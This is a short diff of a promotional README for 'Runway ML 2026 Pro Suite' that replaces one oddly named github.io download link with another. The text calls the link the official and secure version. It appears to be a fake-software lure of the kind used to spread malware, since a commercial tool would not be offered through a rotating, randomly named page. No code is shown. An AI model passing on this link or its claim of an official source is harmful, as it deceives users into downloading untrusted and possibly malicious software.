@@ -42,6 +42,6 @@ A: Updates and new models can be downloaded from the official source linked in t
 
 To get started with Runway ML 2026 Pro Suite, click the link below to access the download page. This ensures you receive the official and secure version of the tool.
 
-[Get it here](https://yellowtaxisave.github.io/download-page/)
+[Get it here](https://capitals-707-bringing.github.io/download-page/)
 
 Remember to follow the installation instructions carefully for a successful setup. If you encounter any issues, consult the FAQ or reach out to the community for support. Enjoy creating with Runway ML and unlock your creative potential!
